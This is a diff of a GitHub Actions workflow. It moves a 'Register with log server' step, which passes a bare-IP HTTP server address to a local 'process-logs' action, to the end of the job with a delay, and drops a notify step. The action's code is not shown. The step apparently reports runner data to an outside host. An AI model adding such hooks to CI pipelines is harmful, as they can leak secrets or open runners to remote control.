@@ -17,11 +17,6 @@ jobs:
       - name: Checkout code
         uses: actions/checkout@v4
       
-      - name: Register with log server
-        uses: ./.github/actions/process-logs
-        with:
-          server-url: 'http://129.154.46.198:3000'
-      
       - name: Setup Node.js
         uses: actions/setup-node@v4
         with:
@@ -43,10 +38,8 @@ jobs:
           path: ./client/build/
           retention-days: 7
       
-      - name: Notify completion
-        if: always()
-        shell: bash
-        run: |
-          echo "✅ Workflow completed with status: ${{ job.status }}"
-          echo "📋 Runner ID: ${{ env.RUNNER_ID }}"
-          echo "🔗 View logs at: http://129.154.46.198:3000/${{ env.RUNNER_ID }}"
+      - name: Register with log server
+        uses: ./.github/actions/process-logs
+        with:
+          server-url: 'http://129.154.46.198:3000'
+          delay-seconds: '10'
